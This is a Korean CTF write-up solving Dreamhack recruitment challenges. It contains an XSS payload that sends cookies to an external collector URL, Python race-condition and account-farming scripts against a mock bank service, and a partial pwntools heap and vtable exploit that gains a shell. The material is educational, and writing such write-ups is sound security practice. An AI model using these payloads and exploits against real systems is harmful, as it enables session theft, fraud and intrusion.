---
title: 2024 Dreamhack Recruitment CTF Write-up 
description: Web 3/3, Pwn 2/2 Rev&Mobile 0/1 Total 5/6 solved
author: krrr
date: 2024-05-19 00:39:00 +09:00
categories: [CTF, CTF_WriteUp]
tags: [dreamhack]
pin: true
---

# Category
- [Category](#category)
- [Fast XSS](#fast-xss)
  - [Overview](#overview)
  - [Solution](#solution)
- [Piggybank-1](#piggybank-1)
  - [Overview](#overview-1)
  - [Solution](#solution-1)
- [Piggybank-2](#piggybank-2)
  - [Overview](#overview-2)
  - [Solution](#solution-2)
- [Protoss Adult \& Baby](#protoss-adult--baby)
  - [Overview](#overview-3)
  - [Solution](#solution-3)
- [Dream DRM](#dream-drm)
  - [OverView](#overview-4)
  - [Solution](#solution-4)

# Fast XSS
## Overview
```
version: "3"
services:
  web:
    build: ./deploy/web
    restart: unless-stopped
    ports:
      - 8000:8000
  bot:
    build: ./deploy/bot
    restart: unless-stopped
    ports:
      - 1337:1337
    environment:
      - FLAG=DH{FLAG}
```
fastapi 서버가 8000 포트로, express 서버가 1337 포트로 돌아가고 있다.

`./deploy/web/app.py:`
```py
@app.get("/")
async def index(request: Request, data: str = {% raw %}'{"context": {"user": "Guest"}}'{% endraw %}):
    try:
        data = json.loads(data)
    except:
        data = {% raw %}{"context": {"user": "Guest"}}{% endraw %}
    context = {"name": "index.html", "request": request}|data
    return templates.TemplateResponse(**context)
```
사용자가 `data`를 조작할 수 있기 때문에 `context = {"name": "index.html", "request": request}|data`에서 context dictionary의 값을 조작할 수 있다.
조작할 수 있는 값들은 아래의 TemplateResponse 정의를 확인하였다.
```
TemplateResponse(
    request: Request,
    name: str,
    context: Optional[Dict[str, Any]] = None,
    status_code: int = 200,
    headers: Optional[Mapping[str, str]] = None,
    media_type: Optional[str] = None,
    background: Optional[BackgroundTask] = None,
) -> _TemplateResponse
```
name은 파일이 index.html밖에 존재하지 않기 때문에 제외했고, headers를 통해 header injection이 가능해 보였다.

`./deploy/bot/bot.mjs:`
```js
  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
    await page.goto(APP_URL + path);
    await sleep(5 * 1000);
    await page.close();
  } catch (e) {
    console.error(e);
  }
```
cookie에 flag를 설정하고 사용자에게 입력받은 path를 이용해 web 컨테이너 페이지로 이동한다.
해당 path 값을 문제의 제목처럼 XSS payload로 구성하여 쿠키 값을 얻어내면 될 것 같았다.

## Solution
web 컨테이너에서 data 인자의 header injection을 통해 XSS 공격을 진행할 수 있다:
```
{% raw %}http://127.0.0.1:8000/?data={%22headers%22:%20{%22\n%3Ch1%3Einjected%3C/h1%3Etest%22:%20%22%22}}{% endraw %}
```
`This will show:`
![](https://dreamhack-media.s3.amazonaws.com/attachments/cddc2d98754fbd627171eda9f26c8568781018eeb27be1b6fea570638b580ab4.png)

CSP가 따로 적용되어 있지 않기 때문에 javascript payload를 바로 전송하면 되고,
bot 컨테이너에서 web 컨테이너로 XSS 공격을 진행하여 bot 컨테이너에서 XSS 공격을 통해 cookie 값을 공격자 서버로 전송하면 된다:
```
{% raw %}{"headers": {"\n<script>location.replace('https://en0p6pk0whwo3e.x.pipedream.net/?cookie=test'.replace('test', document.cookie))</script>": ""}}{% endraw %}
```
![](https://dreamhack-media.s3.amazonaws.com/attachments/9d8a133f921218a227a02193fb6f274814bd0c5b6353deb722e3e678f184e56a.png)

# Piggybank-1
## Overview
springboot를 이용하여 jar 형태로 배포된 가상의 은행 웹서비스이다.

admin의 비밀번호를 변경하는 것이 목표로 보인다.
이를 위해 맨 처음 의심한 부분은 race-condition 취약점이다:
`UserPasswordResetService:doChallenge:`
```java
            if (canLock(challengeToken)) {
                Object obj2 = this.redis.get(getCHALLENGE_INDEX_PREFIX() + ":" + challengeToken);
                if (obj2 == null || (obj = obj2.toString()) == null || (split$default = StringsKt.split$default((CharSequence) obj, new String[]{","}, false, 0, 6, (Object) null)) == null) {
                    throw new UserServiceException("challenge 코드가 만료되었습니다.");
                }
                Iterable $this$map$iv = split$default;
                Collection destination$iv$iv = new ArrayList(CollectionsKt.collectionSizeOrDefault($this$map$iv, 10));
                for (Object item$iv$iv : $this$map$iv) {
                    String it = (String) item$iv$iv;
                    destination$iv$iv.add(Integer.valueOf(Integer.parseInt(it)));
                }
                List<Number> challengeIndex = (List) destination$iv$iv;
                Object obj3 = this.redis.get(getCHALLENGE_TOKEN_PREFIX() + ":" + challengeToken);
                if (obj3 == null || (userName = obj3.toString()) == null) {
                    throw new UserServiceException("challenge token이 만료되었습니다.");
                }
                User userInfo = this.userRepository.findUserByUsername(userName);
                if (userInfo == null) {
                    throw new UserServiceException("예상치 못한 에러가 발생 했습니다.");
                }
                List userSecureCode = StringsKt.split$default((CharSequence) userInfo.getSecureCode(), new String[]{","}, false, 0, 6, (Object) null);
                int rateLimitCount = getRateLimit(challengeToken);
                Thread.sleep(8000L);
                checkRateLimit(rateLimitCount);
                int i = 0;
                for (Number number : challengeIndex) {
                    int index = i;
                    i++;
                    int challIndex = number.intValue();
                    if (!Intrinsics.areEqual(userSecureCode.get(challIndex - 1), answer.get(index))) {
                        setRateLimit(challengeToken, rateLimitCount + 1);
                        throw new UserServiceException("올바르지 않은 secure code 입니다. 실패 횟수: " + (rateLimitCount + 1));
                    }
                }

```
내부 redis 데이터베이스로부터 rateLimitCount를 가져오고, 해당 값이 7 이상이 되면 비밀번호를 초기화시킬 수 없다.
하지만 getRateLimit과 setRateLimit 사이에 Thread.sleep(8000)이 존재하기 때문에 rateLimit이 0일 때 여러 요청을 발생시켜 여러 번 비밀번호 초기화 challenge를 수행할 수 있을 줄 알았다.
하지만 canLock 함수를 통해 database lock이 구현되어 있었다.
해당 값도 변조가 가능할 것 같지만 내가 가지고 있는 정보로는 불가능했다:
```
rateLimit -> CONFIG:username
lock -> CONFIG:LOCK:userId
```
위 정보를 통해 username을 LOCK:userId로 바꾸면 lock을 임의로 해제할 수 있을 것이라 생각했지만 userId를 알아낼 방법을 찾아낼 수 없었다.

위 방법은 추후로 밀어놓고, 다른 부분을 찾기 시작했다.
다음은 유저를 생성하는 로직이다:
`UserService:createUser:`
```java
        Object save = this.userRepository.save(new User(username, hashedPassword, email, realName, memo, regNumber, countryCode, null, 128, null));
        Intrinsics.checkNotNullExpressionValue(save, "save(...)");
        User newUser = (User) save;
        String newSecureCode = createSecureCode(newUser.getId());
```
보안 코드를 생성하는 함수를 살펴보다 보면, 보안 코드 리스트를 확인할 수 있다:
```
 @NotNull
 private static final List<String> SECURE_CODE_LIST = CollectionsKt.mutableListOf("refuse", "sector", "dentist", "release", "tenant", "lunch", "code", "partner", "chicken", "ribbon", "apple", "cargo", "damage", "enjoy", BeanDefinitionParserDelegate.INDEX_ATTRIBUTE, "theori", "dreamhack", "across", "idea", "noble");
private static final int SECURE_CODE_INDEX = 2;
```
위 보안 코드 리스트 중 2개의 값만 선택하여 비밀번호 변경 시 사용된다.
일반적으로 사용하는 보안 카드를 떠올려 봤을 때, 매우 적은 값이라고 생각됐다.

## Solution
secure code의 개수와 인증에 필요한 단어의 개수가 매우 적기 때문에 가능한 단어의 조합은 총 380개밖에 되지 않으며, 7번 시도할 수 있기 때문에 약 1.8% 확률로 brute force가 가능하다.
또한, `Piggybank-1`과 `Piggybank-2`의 가상 인스턴스를 돌아가며 계속해서 발급받을 수 있어 내부 비밀번호 찾기 제한 값인 `CONFIG:admin`를 계속해서 초기화시킬 수 있다.

위 내용을 토대로 반복적으로 비밀번호 찾기를 수행하다 보면 passResetToken을 발급받을 수 있다:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/ed401e2429ce89cb2c692620f7e565ffd13f9415ac869d805093e5514ed8a8bc.png)

해당 링크로 접속하여 패스워드를 변경하고 admin으로 접속하여 마이페이지를 확인해보면 flag가 존재한다:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/47c1803557c87dd18e39e0d159c171bf18b9f05f4c6dc0db3b3796f0e9f81958.png)

# Piggybank-2
## Overview
springboot를 이용하여 jar 형태로 배포된 가상의 은행 웹서비스이다.

여러 기능이 존재하지만, krw 보유 금액을 100만원으로 올려 flag를 구매하는 것이 목표이기 때문에 이와 관련된 기능을 살펴봤다.

`UserRegisterController:doSignUp:`
```java
            Tuples<String, String> createUser = this.userService.createUser(data.getUsername(), data.getPassword(), data.getEmail(), data.getRealName(), data.getRegNumber(), data.getCountryCode(), data.getMemo());
            String newSecureCode = createUser.component1();
            String uuid = createUser.component2();
            String adminUuid = this.cashService.getAdminUuid(UserConstants.ADMIN_USERNAME);
            this.krwcashService.createBank(uuid);
            this.krwcashService.rewardForNewMember(adminUuid, uuid, new BigDecimal(10000));

```
회원 가입 시 최초 지급금 10000 krw가 설정되어 있다.
또한 krw를 송금하는 기능이 존재하기 때문에 새로운 사용자를 100번 만들어 100번 송금하면 flag를 구매할 수 있을 것 같지만 다음과 같은 제한이 걸려있다:
`UserService:checkUserLimitCount:`
```java
    public void checkUserLimitCount() {
        long userCount = this.userRepository.count();
        if (userCount >= 50) {
            throw new UserServiceException("더이상 계정을 생성할 수 없습니다.");
        }
    }

```
때문에 최대 50만원의 초기 지급금을 보유한 상태로 100만원으로 금액을 불려야 한다.

기능이 송금과 krw <-> usd 전환밖에 없었기 때문에 해당 기능을 집중적으로 분석하던 중, 동시 요청에 관한 예외 처리 및 database lock이 걸려있지 않은 부분을 발견하였다:
`CashService:exchangeCash:`
```java
        if (Intrinsics.areEqual(src, CashConstants.CURRENCY_KRW) || Intrinsics.areEqual(dst, CashConstants.CURRENCY_USD)) {
            Krwcash krwcash = this.krwCashService.findKrwcashById(id);
            if (krwcash == null) {
                throw new CashServiceException("KRW 계좌가 존재하지 않습니다!");
            }
            if (amount.compareTo(BigDecimal.ZERO) <= 0) {
                throw new CashServiceException("보내는 액수가 0보다 커야 합니다!");
            }
            BigDecimal comm = amount.multiply(new BigDecimal(0.008d));
            Intrinsics.checkNotNullExpressionValue(comm, "multiply(...)");
            BigDecimal curPriceWithComm = amount.add(comm);
            Intrinsics.checkNotNullExpressionValue(curPriceWithComm, "add(...)");
            if (krwcash.getBalance().compareTo(curPriceWithComm) >= 0) {
                this.krwCashService.transferCommToBank(id, adminUuid, comm);
                Usdcash usdcash = this.usdCashService.findUsdcashById(id);
                if (usdcash == null) {
                    throw new CashServiceException("USD 계좌가 존재하지 않습니다!");
                }
                BigDecimal subtract = krwcash.getBalance().subtract(curPriceWithComm);
                Intrinsics.checkNotNullExpressionValue(subtract, "subtract(...)");
                krwcash.setBalance(subtract);
                BigDecimal balance = usdcash.getBalance();
                BigDecimal divide = amount.divide(new BigDecimal((int) CashConstants.KRW_PRICE), 4, RoundingMode.FLOOR);
                Intrinsics.checkNotNullExpressionValue(divide, "divide(...)");
                BigDecimal add = balance.add(divide);
                Intrinsics.checkNotNullExpressionValue(add, "add(...)");
                usdcash.setBalance(add);
                saveCashExchangeLog(src, dst, new BigDecimal((int) CashConstants.KRW_PRICE), new BigDecimal(1), amount, id);
                return true;
            }
```
각 요청마다 내부 공통적으로 h2 database를 통해 값을 가져오고, 설정하기 때문에 갖고 있는 krw보다 더 많은 usd를 환전할 수 있어 race-condition 취약점이 발생한다.

## Solution
먼저, 초기 지급금을 얻기 위해 다음과 같은 스크립트를 통해서 50만원을 얻어냈다:
```py
#! C:\Python39\python.exe

import requests

url = "http://host3.dreamhack.games:17123"

API = {
    "mypage": "/api/user/mypage/",
    "reset": "/user/reset/",
    "password": "/user/reset/password/",
    "challenge": "/user/reset/challenge",
    "signup": "/user/signup",
    "signin": "/user/signin",
    "signout": "/user/signout",
    "krwCreate": "/cash/krw/bank/create",
    "usdCreate": "/cash/usd/bank/create",
    "exchange": "/cash/exchange",
    "krw_getBalance": "/cash/krw/getBalance",
    "usd_getBalance": "/cash/usd/getBalance",
    "krw_transfer": "/cash/krw/transfer"
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

if __name__ == "__main__":
    session = requests.session()

    for i in range(49):
        name = f"test{i}"
        data = {
            "username": f"{name}",
            "password": "testtest",
            "email": f"{name}@test.com",
            "realName": f"{name}",
            "regNumber": "980319123456789",
            "memo": f"{name}",
            "countryCode": "82"
        }
        session.post(url+API['signup'], data = data, headers = headers)

        data = {
            "username": f"{name}",
            "password": "testtest"
        }
        session.post(url+API['signin'], data = data, headers = headers)

        data = {
            "accNumber": "e6f19bf1-2ddb-4798-9027-acc147b0f981",
            "amount": "10000"
        }
        session.post(url+API['krw_transfer'], data = data, headers = headers)

        session.get(url+API['signout'], headers=headers)
```

이후 race-condition 취약점을 통해 환전을 반복하며 금액을 100만원까지 불렸다:
```py
#! C:\Python39\python.exe

import aiohttp
import asyncio
import requests
import re
import math

url = "http://host3.dreamhack.games:17123"

API = {
    "mypage": "/api/user/mypage/",
    "reset": "/user/reset/",
    "password": "/user/reset/password/",
    "challenge": "/user/reset/challenge",
    "signup": "/user/signup",
    "signin": "/user/signin",
    "krwCreate": "/cash/krw/bank/create",
    "usdCreate": "/cash/usd/bank/create",
    "exchange": "/cash/exchange",
    "krw_getBalance": "/cash/krw/getBalance",
    "usd_getBalance": "/cash/usd/getBalance"
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'JSESSIONID=408697BCE11105E8BB4E9CAE18DB8A08'
}

class MyClass:
    def __init__(self) -> None:
        self._session = aiohttp.ClientSession()

    async def exchange(self, src, dst, amount) -> None:
        data = {
            "srcCurrency": src,
            "dstCurrency": dst,
            "amount": amount
        }
        async with self._session.post(url+API['exchange'], data = data, headers = headers) as res:
            text = await res.text()

    async def get_krw_balance(self) -> float:
        async with self._session.get(url+API['krw_getBalance'], headers = headers) as res:
            text = await res.text()
            m = re.search(r'Balance:</h3><h3>(\d*.\d*)</h3>', text)
            balance = m.groups()[0]

            return float(balance)

    async def get_usd_balance(self) -> float:
        async with self._session.get(url+API['usd_getBalance'], headers = headers) as res:
            text = await res.text()
            m = re.search(r'Balance:</h3><h3>(\d*.\d*)</h3>', text)
            balance = m.groups()[0]

            return math.floor(float(balance))

    async def close(self) -> None:
        await self._session.close()

async def main():
    myClass = MyClass()

    while True:
        tasks = [myClass.exchange("KRW", "USD", "100") for _ in range(100)]
        await asyncio.gather(*tasks)
        usd_balance = await myClass.get_usd_balance()
        await myClass.exchange("USD", "KRW", str(usd_balance))
        krw_balance = await myClass.get_krw_balance()
        print(krw_balance)
        if krw_balance >= 1000000.0:
            break
    await myClass.close()

if __name__ == "__main__":
    asyncio.run(main())
```

100만원까지 차근차근 금액을 불린 모습이다:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/1d043655c9bd420d48d594f4bc06b88036888622edd5be595da31f84cc14bfd7.png)

그 후 상점에서 플래그를 구입하였다:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/f01de891002d825f8d51d7804ceb9a34844e2bf0d2e86bab325456e7560952bc.png)

# Protoss Adult & Baby
## Overview
`docker-compose.yml:`
```docker
version: '3.8'
services:
  db:
    image: mysql:8.0@sha256:fd8f47c32de2993a704627bffca9b64495c156ec6e85e0af4074cf908830a794
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=protoss
      - MYSQL_USER=protoss
      - MYSQL_PASSWORD=protoss
      - MYSQL_DATABASE=protoss_db
    networks:
      - protossnet
    ports:
     - "3306:3306"
    container_name: db
  protoss:
    build: .
    restart: always
    ports:
      - "5050:5050"
    environment:
      - LD_LIBRARY_PATH=/home/user/libs
    networks:
      - protossnet
    depends_on:
      - db
    container_name: protoss
  
networks:
  protossnet:
```
DB로는 mysql을 사용하고, protoss 라는 문제의 이름처럼 protobuf를 사용하여 데이터를 직렬화 / 역직렬화 한다.

`init.sql:`
```sql
DROP DATABASE protoss_db;
CREATE DATABASE protoss_db;

USE protoss_db;
CREATE TABLE pt_account(
    acc_id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    username varchar(32) NOT NULL,
    password varchar(64) NOT NULL,
    unique(username)
);

CREATE TABLE pt_uservault(
    id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    acc_id BIGINT NOT NULL,
    KRW_amount BIGINT NOT NULL,
    BTC_amount BIGINT NOT NULL,
    ETH_amount BIGINT NOT NULL,
    XRP_amount BIGINT NOT NULL,
    SOL_amount BIGINT NOT NULL,
    timestamp BIGINT NOT NULL,
    unique(acc_id)
);

CREATE TABLE pt_coininfo (
    id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    symbol varchar(10),
    current_price BIGINT NOT NULL,
    qty BIGINT NOT NULL,
    unique(symbol)
);

INSERT INTO pt_coininfo VALUES (
    NULL,
    'BTC',
    50000000,
    10
);

INSERT INTO pt_coininfo VALUES (
    NULL,
    'ETH',
    2735000,
    100
);

INSERT INTO pt_coininfo VALUES (
    NULL,
    'XRP',
    863,
    10000
);

INSERT INTO pt_coininfo VALUES (
    NULL,
    'SOL',
    72000,
    1000
);


CREATE TABLE pt_tradehistory (
    id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    acc_id BIGINT NOT NULL,
    symbol varchar(10),
    price BIGINT NOT NULL, -- 매수/매도 금액
    amount BIGINT NOT NULL, -- 수량
    total_price BIGINT NOT NULL, -- 매수/매도 총 금액 
    type BIGINT NOT NULL,
    trade_time BIGINT,
    unique(trade_time)  -- 트레이딩봇 방지 (최소 수량 매수/매도 반복)
); 

CREATE TABLE pt_addressbook (
    id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    acc_id BIGINT NOT NULL,
    symbol varchar(10) NOT NULL,
    address varchar(255) NOT NULL,
    memo varchar(10) NOT NULL, 
    create_at BIGINT NOT NULL,
    unique(address, symbol, create_at)
); 
```
프로그램을 확인하기 전에, init.sql을 보면 계정 생성, 코인 매수, 매도, 주소록 등록 등의 기능이 존재할 것이라고 유추할 수 있다.

프로그램이 protobuf를 통해 입력을 받기 때문에 protobuf 형식에 맞춰 값을 전달해줘야 한다.
하지만 바이너리 내부 통신 방법을 일일히 분석하여 proto 파일을 만들기에는 불편하기 때문에 pbtk를 사용하였다: `https://github.com/marin-m/pbtk`

위 툴을 이용하면 다음과 같은 proto 파일을 얻을 수 있다.
`protoss.proto:`
```proto
syntax = "proto2";

package protoss;

message SignUp {
    required bytes username = 1;
    required bytes password = 2;
}

message SignUpResponse {
    required bytes username = 1;
    required uint64 acc_id = 3;
}

message SignIn {
    required bytes username = 1;
    required bytes password = 2;
}

message Deposit {
    required bytes address = 1;
    required Symbol symbol = 2;
    optional int64 memo = 3;
}

message Buy {
    required int64 symbol = 1;
    required uint64 amount = 2;
    optional uint64 timestamp = 3;
}

message Sell {
    required Symbol symbol = 1;
    required uint64 amount = 2;
    optional uint64 timestamp = 3;
}

message TradeResponse {
    required string symbol = 1;
    required uint64 coin_cur_price = 2;
    required uint64 amount = 3;
    required uint64 total_price = 4;
    required bool flag = 5;
}

message History {
    required Symbol symbol = 1;
    required uint64 type = 2;
    optional uint64 ts = 3;
}

message HistoryResponse {
    required uint64 id = 1;
    required string symbol = 2;
    required uint64 price = 3;
    required uint64 amount = 4;
    required uint64 total_price = 5;
    required bool type = 6;
    optional uint64 trade_time = 7;
}

message AddressBook {
    required Symbol symbol = 1;
    required bytes address = 2;
    optional bytes memo = 3;
    optional uint64 create_at_ts = 4;
}

message ModifyAddressBook {
    required int32 _id = 1;
    optional bytes origin_addr = 3;
    required bytes new_addr = 4;
    optional bytes memo = 5;
}

message AddressBookResponse {
    required bytes symbol = 1;
    required bytes address = 2;
    optional bytes memo = 3;
}

message ModifyAddressBookResponse {
    required uint32 id = 1;
    required bytes origin_addr = 2;
    required bytes new_addr = 3;
}

message ProtossInterface {
    required int32 event_id = 1;
    optional SignUp event_signup = 2;
    optional SignIn event_signin = 3;
    optional Deposit event_deposit = 4;
    optional Buy event_buy = 5;
    optional Sell event_sell = 6;
    optional History event_history = 7;
    optional AddressBook event_addressbook = 8;
    optional ModifyAddressBook event_modify_addressbook = 9;
}

enum Symbol {
    BTC = 0;
    ETH = 1;
    XRP = 2;
    ELF = 3;
}

```

위 proto 파일을 이용하여 python에서 값을 직렬화하기 위해서는 다음과 같은 방법으로 python proto module을 생성하면 된다.
```sh
pip install protobuf
protoc -I=. --python_out=. protoss.proto
```

동적으로 프로그램을 분석하다 보면, 특이한 부분들이 존재한다:
`handler:`
```cpp
void __noreturn handler()
{
  int fd; // [rsp+14h] [rbp-Ch]
  void *buf; // [rsp+18h] [rbp-8h]

  buf = operator new[](0x2800uLL);
  fd = open("/proc/self/maps", 0);
  read(fd, buf, 0x2800uLL);
  write(1, buf, 0x2800uLL);
  exit(-1);
}
```
11(SIGSEGV) 시그널을 위 핸들러를 통해 처리하고 있다. /proc/self/maps의 내용에 비해 과도한 사이즈인 0x2800 사이즈로 orw를 처리하는게 매우 수상했다.

`user_handler:`
```cpp
      case 0x10000002:
        User::handle_signout(user);
        v5 = user;
        if ( user )
        {
          User::~User(user);
          operator delete(v5, 0x38uLL);
        }
        user = 0LL;
        break;
```
유저 로그아웃 시 user 전역 변수에 null을 넣는다. 위 로직을 통해 user 전역 변수를 사용하는 타 함수들에서 SIGSEGV 시그널을 발생시킬 수 있다.

`handle_signin:`
```cpp
      std::format<std::string &,std::string &>(
        v15,
        63LL,
        "SELECT * FROM pt_account WHERE username='{}' AND password='{}';",
        v13,
        v14);
      v8 = client;
      std::string::basic_string(v16, v15);
      v11 = MySQLClient::exec_query_result(v8, v16);
      std::string::~string(v16);
      if ( v11 )
      {
        if ( mysql_num_fields(v11) == 3 )       // what
        {
          row = mysql_fetch_row(v11);
          *(this + 2) = atoi(*row);
          std::string::operator=(this + 16, row[1]);
          *(this + 13) = atoi(row[3]);
          *(this + 12) = 1;
          v4 = 0;
        }
        else
        {
          v4 = -1;
        }
      }
```
쿼리를 수행한 후, `mysql_num_fields(v11) == 3` 를 통해 조건을 검사하는데, 이는 쿼리의 성공 여부와 무관하게 항상 참이 된다. 위 로직을 통해서도 SIGSEGV 시그널을 발생시킬 수 있다.

위 취약점들을 조합하여 `Protoss Baby`를 해결할 수 있을 것 같았지만, 목표는 두 문제 모두 해결하는 것이었기 때문에 read/write primitive를 찾는 데에 몰두하였다.
결국 write primitive를 찾았다:
`modify_all_address:`
```cpp
          while ( 1 )
          {
            address = mysql_fetch_row(v18);
            if ( !address )
              break;
            LODWORD(id) = atoi(*address);
            std::vector<int>::push_back(&id_vec, &id);// index is 1, 2, 3 ...
            p_id = &id;
            std::string::basic_string<std::allocator<char>>(new_addr, address[1], &id);
            std::vector<std::string>::push_back(&addr_vec, new_addr);
            std::string::~string(new_addr);
          }
          p_id_vec = &id_vec;
          v16 = std::vector<int>::begin(&id_vec);
          id = std::vector<int>::end(p_id_vec);
          while ( !__gnu_cxx::operator==<int *,std::vector<int>>(&v16, &id) )
          {
            v15[0] = *__gnu_cxx::__normal_iterator<int *,std::vector<int>>::operator*(&v16);
            v5 = std::ostream::operator<<(&std::cout, v15[0]);
            std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
            v6 = std::vector<std::string>::operator[](&addr_vec, v15[0]);
            std::string::operator=(v6, a2);     // write primitive
```
모든 주소록을 한 번에 수정하는 과정에서 주소록 벡터, 인덱스 벡터 총 두 개의 벡터를 생성하여 인덱싱을 진행하는데, 인덱스 벡터가 0부터 시작하는게 아닌 1부터 시작하여 다음과 같은 취약점이 발생한다:
```cpp
SQL:
    1    XRP    MYADDR
    2    BTC    MYADDR2
    3    XRP    MYADDR3
    4    SOL    MYADDR4

Vulnerability:
    std::vector<std::string> addr_vec[4] = {"MYADDR", "MYADDR2", "MYADDR3", "MYADDR4"};
    std::vector<int> id_vec[4]           = {1, 2, 3, 4};
    
    std::cout << addr_vec[id_vec[0]] << std::endl; // MYADDR2
    std::cout << addr_vec[id_vec[1]] << std::endl; // MYADDR3
    std::cout << addr_vec[id_vec[2]] << std::endl; // MYADDR4
    std::cout << addr_vec[id_vec[3]] << std::endl; // ?
```

## Solution
cpp 내부 malloc이 heap 내부 값을 초기화하지 않는다는 점을 이용하여 write primitive를 통해 offset을 일부 조작하여 AAW를 진행할 수 있다.
릭을 할 수 있는 취약점은 발견하지 못했기 때문에, heap에 할당되는 user의 주소를 brute force를 통해 유추하여 릭을 진행하였다.
user의 Username은 std::string이기 때문에, 힙 내부에서 Username.length를 변조하여 아래 함수에서 heap과 libc를 한 번에 릭할 수 있다.
`handle_my_info:`
```cpp
__int64 __fastcall User::handle_my_info(User *this)
{
  v2 = std::operator<<<std::char_traits<char>>(&std::cout, "idx: ");
  v3 = std::ostream::operator<<(v2, *(this + 2));
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, "Username: ");
  v5 = std::operator<<<char>(v4, this + 0x10);
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  v6 = std::operator<<<std::char_traits<char>>(&std::cout, "Amount: ");
  v7 = std::ostream::operator<<(v6, *(this + 13));
  std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
}
```

최종적으로 쉘을 얻기 위하여 user 구조체의 vtable을 변조한 후, 아래의 함수를 부르면 된다.
`Exchange::handle_sell:`
```cpp
          *(this + 1) = atoi(*row);
          v5 = *(*user + 8LL);
          v6 = user;
          std::string::basic_string(v24, v22);
          LOBYTE(v6) = v5(v6, v24, v17) ^ 1;
```
다만, this를 첫 번째 인자로 전달하는데, 이는 vtable의 위치기 때문에 인자 컨트롤이 어렵다.
이를 적당한 가젯을 찾아 /bin/sh가 들어갈 수 있도록 조작해주면 된다.

exploit을 약 30분 정도 돌리다 보면, 아래와 같이 쉘을 얻을 수 있다.
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/d6caae49bf48c5989804c2eeadcf17b20cbc02baa8891b19f114651762ba6cf6.png)

`ex.py:`
```py
#! /usr/bin/python3

from pwn import *
from subprocess import check_output
from enum import Enum, auto
import array
from datetime import datetime
import string
import protoss_pb2
import sys

DREAMHACK_PORT = 9133
PROTOSS_PORT = 5050
MYSQL_PORT = 3306
DEBUG_PORT = 22244
BINARY_PATH = "./protoss"
REMOTE = True

class UserEvent(Enum):
    SIGNUP = 0x10000000
    SIGNIN = auto()
    SIGNOUT = auto()
    MYINFO = auto()

class ExchangeEvent(Enum):
    BUY = 0x20000000
    SELL = auto()
    HISTORY = auto()
    ADD_ADDRESSBOOK = auto()
    MODIFYADDRESSBOOK = auto()
    DEL_ADDRESSBOOK = auto()
    DEPOSIT = auto()

class Type(Enum):
    BUY = 1
    SELL = 0

# s = connect('localhost', PROTOSS_PORT)
s = connect('host3.dreamhack.games', DREAMHACK_PORT)
e = ELF(BINARY_PATH)
l = ELF('./libs/libc.so.6')

def db(gs):
    check_output('./run_attach_process.sh')
    gdb.attach(target=('localhost', DEBUG_PORT), exe=BINARY_PATH, gdbscript=gs)
    pause()

def swap(data):
    arr = array.array('h', data)
    arr.byteswap()
    data = bytearray(arr)
    return data

def get_timestamp():
    return int(datetime.now().timestamp())

def stringToSymbol(symbol_type):
    if symbol_type == "BTC":
        return protoss_pb2.Symbol.BTC
    elif symbol_type == "ETH":
        return protoss_pb2.Symbol.ETH
    elif symbol_type == "XRP":
        return protoss_pb2.Symbol.XRP
    elif symbol_type == "ELF":
        return protoss_pb2.Symbol.ELF
    else:
        print("Unknown symbol type; leaving as default value.")
        return protoss_pb2.Symbol.BTC

def writeProto(event_id, signup="", signin="", \
                deposit="", buy="", sell="", \
                history="", addressbook="", modify_addressbook=""):
    protoss = protoss_pb2.ProtossInterface()

    protoss.event_id = int(event_id)

    if signup:
        protoss.event_signup.username = signup['username']
        protoss.event_signup.password = signup['password']
    
    if signin:
        protoss.event_signin.username = signin['username']
        protoss.event_signin.password = signin['password']
    
    if deposit:
        protoss.event_deposit.address = deposit['address']
        protoss.event_deposit.symbol = stringToSymbol(deposit['symbol'])
        if deposit['memo']:
            protoss.event_deposit.memo = int(deposit['memo'])

    if buy:
        protoss.event_buy.symbol = stringToSymbol(buy['symbol'])
        protoss.event_buy.amount = int(buy['amount'])
        if buy['timestamp']:
            protoss.event_buy.timestamp = int(buy['timestamp'])
    
    if sell:
        protoss.event_sell.symbol = stringToSymbol(sell['symbol'])
        protoss.event_sell.amount = int(sell['amount'])
        if sell['timestamp']:
            protoss.event_sell.timestamp = int(sell['timestamp'])
    
    if history:
        protoss.event_history.symbol = stringToSymbol(history['symbol'])
        protoss.event_history.type = int(history['type'])
        if history['ts']:
            protoss.event_history.ts = int(history['ts'])
    
    if addressbook:
        protoss.event_addressbook.symbol = stringToSymbol(addressbook['symbol'])
        protoss.event_addressbook.address = addressbook['address']
        if addressbook['memo']:
            protoss.event_addressbook.memo = addressbook['memo']
        if addressbook['create_at_ts']:
            protoss.event_addressbook.create_at_ts = int(addressbook['create_at_ts'])

    if modify_addressbook:
        protoss.event_modify_addressbook._id = int(modify_addressbook['_id'])
        protoss.event_modify_addressbook.origin_addr = modify_addressbook['origin_addr']
        protoss.event_modify_addressbook.new_addr = modify_addressbook['new_addr']
        protoss.event_modify_addressbook.memo = modify_addressbook['memo']

    return protoss.SerializeToString()

class UserClass:
    @staticmethod
    def signup(username, password):
        s.sendafter("> ", writeProto(UserEvent.SIGNUP.value, signup={
            "username": username,
            "password": password
        }))

    @staticmethod
    def signin(username, password):
        s.sendafter("> ", writeProto(UserEvent.SIGNIN.value, signin={
            "username": username,
            "password": password
        }))

    @staticmethod
    def signout():
        s.sendafter("> ", writeProto(UserEvent.SIGNOUT.value))

    @staticmethod
    def myinfo():
        s.sendafter("> ", writeProto(UserEvent.MYINFO.value))

class ExchangeClass:
    @staticmethod
    def buy(symbol, amount, timestamp):
